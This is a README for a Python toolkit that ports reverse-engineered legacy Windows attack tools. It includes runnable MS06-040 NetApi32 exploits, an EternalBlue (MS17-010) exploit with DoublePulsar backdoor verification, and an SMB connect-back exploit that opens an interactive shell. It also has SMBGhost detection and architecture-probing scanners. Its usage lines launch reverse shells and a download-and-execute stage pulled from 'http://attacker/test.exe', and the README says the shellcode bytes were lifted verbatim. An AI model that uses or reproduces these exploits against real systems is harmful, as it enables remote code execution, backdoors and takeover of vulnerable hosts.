# nsa-equation-py

Python reimplementations of legacy tooling (e.g. the DNS payload-builder derived from `dns.exe` via IDA Pro).

## Usage

```bash
nsa-equation-py dns -y bind -R 1.2.3.4 -p 1100
nsa-equation-py dns --list
```

See `dns --help` for all available options (they are forwarded verbatim to `dns_tool`).

### smbv3-scan — CVE-2020-0796 (SMBGhost) 检测

Python rewrite of the scanner embedded in `CVE-2020-0796-Scanner.exe`
(`main` → `smb_poc.run_function(subnet)`). Scans targets and reports hosts
that negotiate SMB 3.1.1 (the CVE-2020-0796 surface). Detection only.

```bash
nsa-equation-py smbv3-scan 192.168.1.5              # single host
nsa-equation-py smbv3-scan 192.168.1.0/24           # scan a whole subnet
nsa-equation-py smbv3-scan 10.0.0.1 10.0.0.2 -p 445 -t 3 -n 64
```

> The original `smb_poc.pyd` is **VMProtect-packed** (`.vmp0`/`.vmp1` sections)
> and its code is virtualized into VM bytecode — a memory dump yields the
> loaded but still-encrypted sections, not readable native logic. This rewrite
> therefore implements the public CVE-2020-0796 detection technique. An
> in-memory dump of the packed module (via x32dbg) was saved alongside the
> scanner as `smb_poc_unpacked.pyd`; it confirms the scanner also links
> WTSAPI32 (`WTSSendMessageW`) for terminal-session messaging.

### get-arch — 主机操作系统架构 (32/64 位) 探测

Python rewrite of `getArch.py`, recovered from the PyInstaller bundle
`getArch.exe` (entry point `getArch.pyc`, Python 2.7) via IDA Pro + archive
recovery.  It probes the RPC Endpoint Mapper on TCP 135 and binds the
portmapper UUID (`MSRPC_UUID_PORTMAP`, `E1AF8308-...` v3.0) using the
**NDR64 transfer syntax** (`71710533-BEBA-4937-8319-B5DBEF9CCC36` v1.0):

- 64-bit Windows accepts NDR64 → `BIND_ACK` context accepted → **64-bit**
- 32-bit Windows lacks NDR64 → `BIND_ACK` context rejected with
  `proposed_transfer_syntaxes_not_supported` → **32-bit**

Dependency-free (raw DCERPC BIND packet built by hand — the 72-byte request
matches impacket's output byte-for-byte).  Read-only architectural probe.

```bash
nsa-equation-py get-arch -target 192.168.1.5              # single host
nsa-equation-py get-arch -targets hosts.txt -timeout 2    # one host per line
```

### netapi32-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用

Python rewrite of the Mika MS06-040 RPC exploit recovered from
`ms06040rpc.exe` (memory-packed; OEP 0x401000 unpacked via x32dbg + IDA Pro).
It binds the remote **Browser RPC interface** (`4b324fc8-1670-01d3-1278-5a47bf6ee188`)
over the `\\<host>\\pipe\\BROWSER` named pipe and fires a **NetpwPathCanonicalize**
overflow request (opnum 0x1F), carrying an XOR-encoded shellcode:

- `os_type 1` → Windows 2000 SP4  (request 1152 B, sent once)
- `os_type 2` → Windows XP SP1   (request 796 B, sent twice)
- **reverse-shell**   : patches LHOST/LPORT into an msfvenom-style reverse_tcp stage
- **download-exec**   : embeds a URL and XOR-encodes a download-and-run stage

The exact payload/request bytes are lifted verbatim from the unpacked image.
Transport uses **impacket** (SMB named-pipe) to mirror the C original's
`WNetAddConnection2A + CreateFileW("\\host\\pipe\\BROWSER")`:

```bash
pip install impacket
nsa-equation-py netapi32-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell
nsa-equation-py netapi32-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec
```

### rpc-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用 (v2 构建)

Python rewrite of the **v2 / modified** build `ms06040rpc_unpacked_v2.exe`
(memory-packed, OEP 0x4018F6; unpacked real logic recovered via IDA Pro +
x32dbg memory dump).  It is the same Mika MS06-040 exploit family as
`netapi32-exp`, with two differences recovered from the image:

- the **BIND abstract syntax** is the BROWSER alias `6a281939-0cb1-11d0-9ba8-00c04fd92ef5`
  (v0.0, UUID fields stored big-endian as printed — see `build_bind`),
  instead of the original build's `4b324fc8-...` v3.0
- the transport is **dependency-free**: a raw SMBv1 client (negotiate →
  session setup → tree connect IPC$ → `NT_CREATE_ANDX` on `\BROWSER` →
  `WRITE_ANDX`) whose frames were verified byte-for-byte against impacket's
  serialisation.  It mirrors the C original's
  `WNetAddConnection2A + CreateFileA + WriteFile` on
  `\\host\pipe\BROWSER`.

Everything else — the `NetpwPathCanonicalize` opcode 0x1F request bodies
(`os_type 1` win2k 1152 B / `os_type 2` winxp 796 B), the reverse_tcp and
download-exec shellcode templates, and the XOR-encoding scheme — is
**byte-identical** to `netapi32-exp` (verified against the 0x407278 / 0x4076E4 /
0x407030 / 0x407158 image regions).

```bash
nsa-equation-py rpc-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell (v2)
nsa-equation-py rpc-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec (v2)
```

### reternal-blue — MS17-010 (ETERNALBLUE) SMBv1 远程利用

Python rewrite of the NSA EternalBlue exploit `Eternalblue-2.2.0.exe` (C++
DAVE-framework) recovered via IDA Pro.  It drives the MS17-010 exploitation
sequence over SMBv1 (TCP 445): SMB echo ping → architecture detection
(x86/x64) → non-paged pool grooming → exploit buffer → optional DoublePulsar
backdoor verify.  It also reimplements the tool's key=value parameter
interface (`Target`, `TargetIp`, `TargetPort`, `NetworkTimeout`,
`GroomAllocations`, `MaxExploitAttempts`, `VerifyTarget`, `VerifyBackdoor`).

Dependency-free (stdlib raw SMBv1 client).

```bash
nsa-equation-py reternal-blue 192.168.1.5 -a x64 --verify-backdoor
nsa-equation-py reternal-blue 192.168.1.5 --groom 400 -o win7
```### smbexp — Exploiting SMB (12008smbexp) 利用

Python port of `12008smbexp\smbexp.exe` (recovered via IDA Pro, payload bytes
lifted verbatim from the `.data` section).  A connect-back SMB exploit family
tool:

```
smbexp.exe <TagIp> <BackPort>           # local IP auto-detected
smbexp.exe <TagIp> <LocalIp> <BackPort> # explicit local IP
```

Workflow recovered from `_main` (0x401890) / `StartAddress` (0x4014B0) /
`sub_401400` / `sub_401640` / `sub_401770`:

1. TCP 445, send 106-byte SMB negotiate (`buf_0`, 0x4031A4); the response's
   qword[108]−qword[116] "uptime hint" drives a defensive
   `Maybe Blue Screen. Wait For %d Minutes` prompt (1 continue / 2 quit).
2. Three heap-grooming phases on fresh 445 connections, all reusing the same
   564-byte SMB packet (`buf_`, 0x403210) with byte[176] = phase 0/1/2:
   **70 / 86 / 195 connections** (prints `Send packets 1/2/3`).
3. `sub_401400` XOR-0xFE-patches the local IP into the 322-byte stage
   (`buf`, 0x403010) at qword offset 0x077, then starts a listener on
   `<BackPort>`.
4. Patches the 1197-byte exploit packet (`buf_1`, 0x40344C) at
   0x3EC/0x3F0 with socket-address bytes, sends it, sleeps 10 s.
5. On connect-back: prints `L* ExpOk.`, sends the stage, and drops into an
   interactive shell (`exit\r\n` quits).

```bash
nsa-equation-py smbexp 192.168.1.11 21            # listener on :21
nsa-equation-py smbexp 192.168.1.11 21 -l 10.0.0.5 -y
```

### setourip — SetOurIp.exe 文件复制工具

Python port of `SetOurIp.exe` (LegacyWindowsExploits/Resources/Tools).
The current build no longer rewrites `127.0.0.1`: it is a thin `CopyFileA`
wrapper that prints *"File copied (set of IP no longer done with this exe)"*.
The optional 3rd argument (IP) is parsed but ignored.

```bash
nsa-equation-py setourip in.bin out.bin
```

### 覆盖矩阵

`re_project/coverage_matrix.md` 文件对根目录全部 187 个 EXE（153 个唯一 MD5）
建立了完整覆盖矩阵：16 个子命令已覆盖，剩余分为「DAVE 框架工具」（81 个，
共享 adfw/posh/tibe/trfo/trch/tucl 协议栈，建议先建统一 DAVE 协议库再逐批
移植）、「独立自研工具」（oddjob/DSky/Df/Ep/GROK/PC 套件等）与「第三方捆绑
工具」（nc/rar/reg/sc/wininst 等，不移植）。